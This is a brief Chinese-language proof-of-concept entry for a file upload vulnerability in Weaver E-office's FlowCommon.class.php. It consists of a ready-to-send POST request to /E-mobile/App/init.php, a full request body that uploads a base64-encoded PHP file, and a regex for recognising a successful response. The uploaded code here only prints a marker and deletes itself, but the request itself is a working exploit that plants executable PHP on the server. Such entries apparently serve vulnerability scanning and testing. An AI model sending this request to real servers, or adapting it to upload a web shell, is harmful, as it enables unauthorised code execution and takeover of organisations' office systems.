# 泛微E-officeFlowCommon.class.php文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **请求**：`POST /E-mobile/App/init.php HTTP/1.1`

**Payload**
```
m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name=test123.php
```
- **响应特征**：200 ^(?=.*?url)(?=.*?diff).*?$